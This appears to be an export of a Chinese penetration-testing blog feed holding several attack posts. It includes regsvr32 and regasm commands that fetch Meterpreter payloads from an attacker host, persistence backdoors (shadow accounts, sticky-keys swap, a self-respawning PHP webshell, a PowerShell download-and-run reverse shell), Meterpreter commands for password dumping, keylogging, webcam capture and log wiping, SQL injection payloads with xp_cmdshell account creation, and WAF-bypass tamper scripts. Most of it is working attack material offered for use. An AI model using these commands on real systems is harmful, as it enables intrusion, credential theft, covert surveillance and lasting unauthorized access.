/usr/share/greatsct-output/handlers/payload.rc 生成恶意sct文件现在，从payload列表中，您可以选择任何目标进行所需的攻击。但对于这次攻击，我们将使用： use regsvr32/shellcode_inject/base64_migrate.py执行命令后，输入以下命令： generate 然后它会询问你payload。只需按Enter键，它将把Windows/MeterPreter/Reverse_TCP作为默认payload，这就是我们需要的payload。在此之后，我们提供192.168.1.107和给定端口（any），如下图所示，我们将lport设置为2345。 在提供详细信息后，它会询问您的恶意软件名称。默认情况下，它将设置名称w为payload，以便您可以指定名称，或者只需按Enter键进行默认设置。 当你按Enter键时，它会生成两个文件。其中一个是资源文件，另一个是.sct文件。现在在/usr/share/greatsct output/source中启动python的服务器，方法是输入： python -m SimpleHTTPServer 80 现在在受害者PC的运行窗口中执行.sct文件，如下所示 regsvr32.exe /s /u /n /i:http://192.168.1.107/payload.sct 同时，使用资源文件启动multi/handler。为此，请输入以下命令： msfconsole -r /usr/share/greatsct-output/handlers/payload.rc 生成恶意dll文件现在，从payload列表中，您可以选择任何目标进行所需的攻击。但对于这次攻击，我们将使用： use regasm/meterpreter/rev_tcp.py 执行命令后，输入以下： set lhost 192.168.1.107 generate 在提供详细信息后，它会询问您恶意软件的名称。默认情况下，它将设置名称为payload，便您可以指定名称，或者只需按Enter键进行默认设置。 当您按Enter键时，它将生成dll文件 现在输入以下命令启动/usr/share/greatsct中的python服务器： python -m SimpleHTTPServer 80 现在将上面生成的dll文件放入c:\window s\microsoft.net\framework\v4.0.30319\v4.0.30319\中，然后在受害者PC的命令窗口中执行.dll文件，如下所示： C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll同时，使用资源文件启动multi/handler。为此，请输入以下命令： msfconsole -r /usr/share/greatsct-output/handlers/payload.rc 参考链接: http://www.bubuko.com/infodetail-2980098.html https://www.freebuf.com/articles/system/155147.html]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具篇</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[后渗透之维护权限]]></title>
    <url>%2Farchives%2Fb9ce30ce.html</url>
    <content type="text"><![CDATA[简介何为“后渗透”？就是获取到受害者服务器的权限后，再继续对受害者服务器进行长期攻击或者信息获取的一种持续性手段。常见的手段有，后门、影子账户、会话劫持等等。 实验一、影子账户原理：创建一个跟普通用户一样的用户，但是只能在注册表中才能查看到的用户。 net user username$ /add net user二、shift后门原理：将按5下shift时调用的“粘滞键”替换为“CMD” 将 C:\WINDOWS\system32\dllcache\sethc.exe删除，这个文件夹中放着缓存，如果不 删除就会自动变回去 找到 C:\WINDOWS\system32\cmd.exe 将其复制并将名称更改为 sethc.exe，放回文 件夹中 这次按5次shift键就可以打开cmd了三、反弹加入自启（鸡肋）1、NC反弹 2、Bash反弹 3、perl反弹 4、Python反弹 5、PHP反弹 6、等等 反弹代码参考这里 http://maikefee.com/archives/5d509f57.html 将反弹的脚本写入到启动项里，当受害者启动服务器时，自动反弹shell。弊端就是要一直监听，还要有公网的IP。 四、隐藏后门文件 1、将木马文件属性改为“隐藏”2、将木马名字进行伪装处理，伪装成系统文件或者报错文件。修改时间跟系统文件时间类似。3、利用循环不死马（举栗子） &lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1){ file_put_contents(&apos;phpinf0.php&apos;,&apos;&lt;?php $a=array($_REQUEST[&quot;kk&quot;]=&gt;&quot;3&quot;); $b=array_keys($a)[0]; eval($b);?&gt;&apos;); sleep(8); } ?&gt; 说明：此脚本会每8秒不断的向服务器生成一个“phpinf0.php”的一句话木马. 五、利用.user.ini文件自动包含木马文件 在“.user.ini”文件写入 auto_prepend_file=pic.gif 在”pic.gif”文件写入一句话木马 &lt;!–?php $a = “a”.”s”.”s”.”e”.”r”.”t”;$a($_POST[“kk”]); ?–&gt; 利用成功前提下必须有以下三个文件， 1、PHP的正常文件 2、修改后.user.ini文件 3、luomiweixiong.gif木马 说明：在限制了PHP文件上传的条件下，上传ini文件，再进行文件包含拿shell. 六、Powershell权限维持参考此PowerShell脚本 https://github.com/re4lity/Schtasks-Backdoor利用代码： powershell.exe-exec bypass -c &quot;IEX (New-ObjectNet.WebClient).DownloadString(&apos;http://192.168.124.25/Invoke-taskBackdoor.ps1&apos;);Invoke-Tasksbackdoor-method nccat -ip 192.168.124.14 -port 666 -time 2&quot;说明： 1、192.168.124.25为受害者IP,前提是要把PowerShell脚本放到受害者服务器能访问到的根路径。 2、192.168.124.14为接收反弹回来的IP,可用NC监听反弹回来的shell 七、metasploit权限维持1、Persistence模块 前提是利用MSF获取到了对方的会话 run persistence -U -i 12 -p 6666 -r 192.168.124.14说明 -i 目标自动回连时间 -p 设置目标反向连接的端口 -r 设置目标反向连接的ip地址 -U 设置目标自启动 加入自启动后，就算受害者机器再次启动也能弹回shell 2、metsvc 模块 前提是利用MSF获取到了对方的会话 run metsvc -A 说明： -A 自动启动一个匹配的 multi/handler 以连接到该服务 该模块是在受害者服务器开启了一个“Meterpreter”服务 下次攻击者可以利用metsvc_bind_tcp监听模块就可以再次获取到shell 监听端口为31337八、会话劫持说明：RDP会话劫持是在不知道另一用户密码的条件下进行切换用户登录 query user sc create sesshijack binpath= &quot;cmd.exe /k tscon 1 /dest:rdp-tcp#4&quot; net start sesshijack 维护权限还有很多种方法，我这里只是举几个栗子. 公众号看到的,做个记录.]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit免杀payload笔记(持续更新)]]></title>
    <url>%2Farchives%2F2c24cfb2.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具篇</category>
        <category>Metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Win_telnet打造端口扫描工具]]></title>
    <url>%2Farchives%2F7c32cf47.html</url>
    <content type="text"><![CDATA[@echo off set Cms=%* setlocal enabledelayedexpansion set files=&quot;&quot; set ports=&quot;&quot; color 06 title telnet-scan端口扫描工具 if not defined Cms goto main ::-----------------参数分离开始----------------------------------- if &quot;%1&quot; == &quot;-l&quot; ( set files=%2 ) if &quot;%1&quot; == &quot;-d&quot; ( goto del_history ) if &quot;%3&quot; == &quot;-l&quot; ( set files=%4 ) if &quot;%1&quot; == &quot;-p&quot; ( set ports=%2 ) if &quot;%3&quot; == &quot;-p&quot; ( set ports=%4 ) echo %ports% echo %files% ::-----------------参数分离结束----------------------------------- ::计算域名总数 set /a num=0 for /f %%i in (%files%) do ( set /a num=!num!+1 ) ::----------------------开始扫描---------------------------------- set /a a=1 :sxh set port=&quot;&quot; for /f &quot;tokens=%a% delims=.&quot; %%i in (&apos;echo %ports%&apos;) do ( set port=%%i set /a a=%a%+1 ) if !port! NEQ &quot;&quot; ( echo --------------------程序正在扫描 !port! 端口,请稍后--------------------------------- ::设置扫描到第几个域名 set /a nm=0 ::设置提示保存 set /a tib=0 for /f %%b in (%files%) do ( start /min cmd.exe /k &quot;echo q|telnet %%b !port!&amp;exit&quot; timeout /NOBREAK /t 1 &gt;nul set pd=&quot;&quot; for /f &quot;tokens=1 delims= &quot; %%a in (&apos;tasklist /FI &quot;windowtitle eq Telnet %%b&quot;^|findstr &quot;cmd.exe&quot;&apos;) do ( set pd=%%a ) if !pd! EQU &quot;&quot; ( echo %%b !port! Open echo %%b&gt;&gt;!port!_Open.txt set /a tib=1 ) else ( echo %%b !port! Close ) set /a nm=!nm!+1 title telnet-scan端口扫描工具 进度 !nm!/!num! ) if !tib! == 0 ( echo -------------------------端口 !port! 扫描完毕----------------------------------------- ) else ( echo -------------------------端口 !port! 扫描完毕,保存为 !port!_Open.txt----------------------- ) timeout /NOBREAK /t 35 &gt;nul goto sxh ) else ( goto tc ) ::----------------------扫描结束---------------------------------- :del_history echo 正在删除历史扫描记录,请稍后....... for /l %%i in (1,1,10000) do ( del /f /q %%i_Open.txt 1&gt;nul 2&gt;nul ) echo 删除完毕!!! goto tc :main mode con: cols=125 lines=45 echo _ _ _ echo ^| ^|_ ___^| ^|_ __ ___^| ^|_ ___ ___ __ _ _ __ echo ^| __^/ _ ^\ ^| ^&apos;_ ^\ ^/ _ ^\ __^|____^/ __^|^/ __^/ _^` ^| ^&apos;_ ^\ echo ^| ^|^| __^/ ^| ^| ^| ^| __^/ ^|^|_____^\__ ^\ ^(_^| ^(_^| ^| ^| ^| ^| echo ^\__^\___^|_^|_^| ^|_^|^\___^|^\__^| ^|___^/^\___^\__^,_^|_^| ^|_^| echo. echo ^&lt;options^&gt;: echo -l list :域名列表文件 echo -p port :要扫描的端口 echo -d del :删除保存的历史记录(开放的端口号.txt) echo. echo ^&lt;Example^&gt;: echo scan.bat -l c:\host.txt -p 21 echo scan.bat -l c:\host.txt -p 21.80.3389.1433 echo. :tc]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具篇</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MSF后渗透利用整理|MSF命令大全]]></title>
    <url>%2Farchives%2F5302ec6.html</url>
    <content type="text"><![CDATA[后渗透脚本知识 权限维持、权限提升、内网渗透等 内网渗透：信息搜集、读取用户hash、浏览器密码 域渗透：获取域控的控制权 Meterpreter基本概念 Meterpreter是Metasploit框架中的一个扩展模块，在攻击成 功以后给我们返回一个控制通道，是metsploit后渗透必不可少的 ，它具有强大的功能，包括socks代理，端口转发，键盘监听等多 个功能，meterpreter可以说是内网渗透测试神器。 基本功能（1）系统信息获取 （2）密码哈希导出 （3）文件上传下载 （4）屏幕截取 （5）键盘记录 （6）权限提升 （7）跳板攻击 （8）反追踪 优点： 纯内存工作模式，执行漏洞渗透攻击的时候会直接装载meterpreter的 动态链接库到目标进程的空间中，使得meterpreter启动隐蔽，很难被杀毒软 件检测到； 一、后渗透基本操作1.基本命令background # 让meterpreter处于后台模式 sessions -i index # 与会话进行交互，index表示第一个session quit # 退出会话 shell # 获得控制台权限 irb # 开启ruby终端 2.文件操作命令 cat # 查看文件内容 getwd # 查看当前工作目录 upload # 上传文件到目标机上 download # 下载文件到本机上 edit # 编辑文件 search # 搜索文件3.网络命令ipconfig / ifconfig # 查看网络接口信息 Portfwd # 端口转发 本机监听端口 把目标机端口转到本机端口上 Rdesktop # 使用rdesktop来连接 -u 用户名 -p 密码 Route # 获取路由表信息1.系统命令ps # 查看当前活跃进程 migrate pid # 将Meterpreter会话移植到进程数位pid的进程中 execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互 getpid # 获取当前进程的pid kill pid # 杀死进程 getuid # 查看权限 sysinfo # 查看目标机系统信息，如机器名，操作系统等 shutdown # 关机三、后渗透高级操作1.Post模块run post/windows/gather/enum_applications #获取安装软件信息 run post/windows/gather/dumplinks #获取最近的文件操作 run scraper #获取常见信息 #保存在～/.msf4/logs/scripts/scraper/目录下 run post/windows/gather/enum_patches #补丁信息 run post/windows/gather/enum_domain #查找域控2.Load命令load #加载模块 meterpreter &gt; load mimikatz #加载mimikatz meterpreter &gt; load incognito #加载incoginto 盗窃目标主机的令牌或是假冒用户3.信息搜集 用户是否在线 ①查看是否为虚拟机 run post/windows/gather/checkvm ② quser ：查看用户是否在线 ③idletime ：检查受害者闲置多久 ④screenshot ：截屏 获取目标主机安装软件信息； run post/windows/gather/enum_applications 查看目标主机的补丁信息； Run post/windows/gather/enum_patches 查找目标主机域控 run post/windows/gather/enum_domain 关闭杀毒软件 run post/windows/manage/killav 开启3389远程桌面 run post/windows/manage/enable_rdp4.用户口令①hash我们需要将administrator权限提升至system权限才能获取成功 meterpreter &gt; run post/windows/gather/smart_hashdump 将域的密码也打出来②mimikatzmeterpreter &gt; load mimikatz #加载mimikatz meterpreter &gt; msv #获取hash值 meterpreter &gt; Kerberos #获取明文 meterpreter &gt; ssp #获取明文信息 meterpreter &gt; wdigest #获取系统账户信息 meterpreter &gt; mimikatz_command -f a:: #必须要以错误的模块来让正确的模块显示 meterpreter &gt; mimikatz_command -f hash:: #获取目标 hash meterpreter &gt; mimikatz_command -f samdump::hashes meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords四、权限提升1.普通用户利用漏洞获取权限 use exploit/windows/local/ms18_8120_win32k_privesc 2.关闭防火墙 netsh advfirewall set allprofiles state off4.本地提权search local/ms5.绕过UACuse exploit/windows/local/bypassuac use exploit/windows/local/bypassuac_injection use windows/local/bypassuac_vbs use windows/local/ask6.获取system权限7.缓存口令①Chrome #获取Chrome缓存 run post/windows/gather/enum_chrome ②Firefox #获取Firefox缓存 run post/windows/gather/enum_firefox ③I.E #获取IE缓存 run post/windows/gather/enum_ie8. 键盘记录：①keyscan_start：开启键盘记录功能 ②keyscan_dump：显示捕捉到的键盘记录信息 ③keyscan_stop：停止键盘记录功能 run keylogrecorder9.搜索：search在目标主机上找到特定文件，可搜索整个系统中的特定文件。10.域口令获取①steal_token 试图窃取指定（PID）进程的令牌 ②use incognito #加载incoginto功能（用来盗窃目标主机的令牌或是假冒用户) ③list_tokens –u #列出目标主机用户的可用令牌 ④list_tokens –g #列出目标主机用户组的可用令牌 然后使用ps，查看pid号五、主机信息1. sysinfo 2.post(后渗透模块) run post/windows/gather/enum_applications #获取安装软件信息 run post/windows/gather/dumplinks #获取最近的文件操作 run scraper #获取常见信息 #保存在～/.msf4/logs/scripts/scraper/目录下 run post/windows/gather/enum_patches #补丁信息 run post/windows/gather/enum_domain #查找域控3.摄像头信息record_mic #音频录制 webcam_chat #查看摄像头接口 webcam_list #查看摄像头列表 webcam_stream #摄像头视频获取六、内网渗透1.psexec exploit/windows/smb/psexec 先在meterpreter下使用 run post/windows/gather/smart_hashdump打印出账号和口令 记得先关闭靶机的防火墙，可以在shell中使用命令： netsh advfirewall set allprofiles state off 2.execute 产生一个交互式的cmd： 我们可以使用-H参数来隐藏打开的应用3.incognito使用use incognito命令加载incognito功能七、客户端渗透，持久化1.migrate 可以将meterpreter当前的进程移动到其他指定的进程中，这样做的好处是可以给meterpreter一个相对稳定的运行环境，同时可以很好的躲避杀毒软件2.metsvcMeterpreter提供2种方式的后门，一种是通过服务启动(metsvc)，一种是通过启动项启动(persistence)。 通过服务(metsvc)启动方式，优点是命令简单方便，不需要设置太多参数。该后门在目标机器自启动一个“服务器”等攻击者连接，攻击者可以随时随地通过该后门加入目标机器。缺点就是其他攻击者扫描出该“服务器”的存在时，任何人便可以通过该后门直达目标机器内部。3. persistence 通过启动项启动(persistence)的方式，其缺点便是参数较为复杂，当设置某项参数后，很有可能因为权限问题导致该设置项并未生效，并且无错误回显，导致持续化控制可能失败。当然，其优点也可圈可点。该方式是在目标机器上以反弹回连方式来连接攻击者的”服务器”，目标机器上的防火墙对于此等操作一般均会放行，因此后门的存活率较高。 -A 自动启动一个匹配的exploit / multi / handler来连接到代理 -L 如果未使用％TEMP％，则在目标主机中写入有效负载的位置。 -P 有效负载使用，默认为windows / meterpreter / reverse_tcp，默认生成的后门为32位，如果目标机器为64位时，留下的后门无法使用。 -S 作为服务自动启动代理程序（具有SYSTEM权限） -T 要使用的备用可执行模板 -U 用户登录时自动启动代理 ，该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。 -X 系统引导时自动启动代理程序，该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数。 -h 这个帮助菜单 -i 每次连接尝试之间的时间间隔（秒） -p 运行Metasploit的系统正在侦听的端口 ，即设置反向连接的端口号 -r 运行Metasploit监听连接的系统的IP 例子： 留好后门之后，我们需要设置监听端口等配置信息等待后门的触发，将其反弹到我们的攻击机。 4.run vnc （远程控制软件类似于3389） 开启远程，可以实时监视受害者的操作情况 5.getgui（创建一个用户，客户端化）常用命令： run getgui –h #查看帮助 run getgui –e #开启远程桌面 run getgui -u Star_Cheng -p 123321 #添加用户 run getgui -f 4446 –e #3389端口转发到4446例子： 首先先添加一个用户： run getgui -u Star_Cheng -p 123321 执行远程桌面命令： rdesktop -u Star_Cheng 10.10.10.141 接着输入密码即可连接上对方桌面。也可输入-p 参数将密码补上 也可以使用enable_rdp脚本来实现开启rdp和添加用户，在meterpreter使用如下命令： run post/windows/manage/enable_rdp #开启远程桌面 run post/windows/manage/enable_rdp USERNAME=Star2 PASSWORD=123321 #添加用户RQ2 run post/windows/manage/enable_rdp FORWARD=true LPORT=4435 #将3389端口转发到9988八、 路由设置 实验机： MSF攻击机：202.192.29.17 跳板机：202.192.29.45 内网目标机：192.168.118.129 这里从我们已经拿下了跳板机开始，我们直接使用msfvenom传给跳板机点击，生成一个session：设置好msf配置信息：use exploit/multi/handler set payload windows/meterpreter/reverse_tcp show options set LHOST 202.192.29.17 set LPORT 4444 run 获取到shell后如果出现乱码，使用chcp命令： 1.route 查询内网本地路由查询，得到内网网段地址为：192.168.118.0/24 接下来我们需要添加去往目标内网网段（192.168.118.0/24）的静态路由，使用run autoroute -s 202.192.118.0/24添加，使用run autoroute -p查看是否添加成功： 设置好路由之后，我们就可以对内网进行扫描了，做一个简单的测试，扫描内网的3389端口： 我们试着内网主机进行扫描，查看是否存在ms17_010漏洞： 发现192.168.118.129这台机子有可能存在漏洞，接着便可以实施进一步攻击九、清除痕迹1.clearev在渗透入侵的过程中难免会留下一下日志信息痕迹，我们可以使用此命令来擦除留下的痕迹：2.timestomp将时间统一，减少被发现的概率3.systeminfo查看是否少了补丁]]></content>
      <categories>
        <category>渗透测试</category>
        <category>工具篇</category>
        <category>Metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Access+Mssql+Mysql 手工注入基本流程]]></title>
    <url>%2Farchives%2F5e06e84c.html</url>
    <content type="text"><![CDATA[Access 注入:判断表名：adminand (select count(*) from admin)&amp;gt;0判断字段名：username,passwordadmin_user admin_pwd and (select count(admin_user) from admin)&amp;gt;0猜解值的长度：admin_user=5 admin_pwd=16and (select len(admin_user) from admin)=4依次尝试猜属性值：and (select left(admin_user,1) from admin)=&apos;a&apos; 在’ ‘中依次尝试字母数字 and (select left(admin_user,2) from admin)=&apos;ad&apos; and (select left(admin_user,3) from admin)=&apos;adm&apos;偏移注入猜表名：and exists (select * from 你要猜得表名)查看是否存在表名 （存在的情况下页面刷新正常，同理猜字段一样的 结果存在admin） 猜列名的字段名：and exists (select 你要猜的字段名 from 你已经才出来的表名)查看是否存在字段名（结果存在username和password）order by n 直到返回不正常，那么返回的列数就是n-1。n用二分法取。得出显位的数字 union select 1,2,3,4,5,…,n-1 from admin 用显位猜解出字段内容union select 1,2,username,4,5,...,n-1 from adminMssql/sqlserver 注入:判断注入点:and 1=1 and 1=2猜版本:and 1=@@version猜用户名:and 1=user猜当前连接数据库:articleand 1=db_name()猜解其它数据库：and 1=(select name from master.dbo.sysdatabases where dbid=6)猜第一个表名：’admin’因为列的当前数据库，所以 sysobjects=article.sys.sysobjects and (select top 1 name from sysobjects where xtype=&apos;u&apos;)&amp;gt;0猜其他表名：’t_jiaozhu’and (select top 1 name from sysobjects where xtype=&apos;u&apos; and name not in(&apos;admin&apos;))&amp;gt;0猜字段：username,passwordand (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&amp;gt;0猜值and (select username from admin)&amp;gt;0破解密码MD5或者更改密码MD5值 后续操作sqlserver 存储扩展应用建立系统用户：net user username pass /add系统提权net localgroup administrators username /add打开3389reg add &quot;hklm\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d &quot;0&quot; /f建立数据库用户：;exec master..sp_addlogin user,pass;--数据库提权：;exec master..sp_addsrvrolemember aa,sysadmin;-- xp_cmdshell应用建立系统用户;exec master..xp_cmdshell;net user bb bb /add;--防止xp_cmdshell：;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;恢复xp_cmdshell;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;彻底防溢出c:\windows\system32\cmd.exe 删除所有默认权限.添加administrator–完全控制Mysql 注入：猜解字段数order by 3%23 union select 1,2,3%23获取当前数据库名union select 1,(select database()) ,3%23 security获取所有数据库名union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23 information_schema,challenges,mysql,performance_schema,security获取表名union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479)%23 emails,referers,uagents,users获取列名union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7365637572697479 and table_name=0x7573657273)%23 id,username,password获取数据union select 1,2,(select group_concat(id,0x7c,username,0x7c,password) from security.users)%23获取数据库版本union select 1,@@version,database()%23]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>Sql注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Sqlmap注入之tamper绕过WAF脚本列表]]></title>
    <url>%2Farchives%2F7356a0d2.html</url>
    <content type="text"><![CDATA[使用方法–tamper xxx.py apostrophemask.py 用UTF-8全角字符替换单引号字符 apostrophenullencode.py 用非法双字节unicode字符替换单引号字符 appendnullbyte.py 在payload末尾添加空字符编码 base64encode.py 对给定的payload全部字符使用Base64编码 between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=” bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=” chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符） charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符） charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符） concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例 equaltolike.py 用“LIKE”运算符替换全部等于号“=” greatest.py 用“GREATEST”函数替换大于号“&gt;” halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释 ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例 lowercase.py 用小写值替换每个关键字字符 modsecurityversioned.py 用注释包围完整的查询 modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询 multiplespaces.py 在SQL关键字周围添加多个空格 nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器 overlongutf8.py 转换给定的payload当中的所有字符 percentage.py 在每个字符之前添加一个百分号 randomcase.py 随机转换每个关键字字符的大小写 randomcomments.py 向SQL关键字中插入随机注释 securesphere.py 添加经过特殊构造的字符串 sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs space2comment.py 用“/**/”替换空格符 space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符 space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符 space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符 space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符 space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符 space2plus.py 用加号“+”替换空格符 space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符 unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT” unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符 varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF versionedkeywords.py 用MySQL注释包围每个非函数关键字 versionedmorekeywords.py 用MySQL注释包围每个关键字 xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[过安全狗waf注入方法技巧]]></title>
    <url>%2Farchives%2F6defc515.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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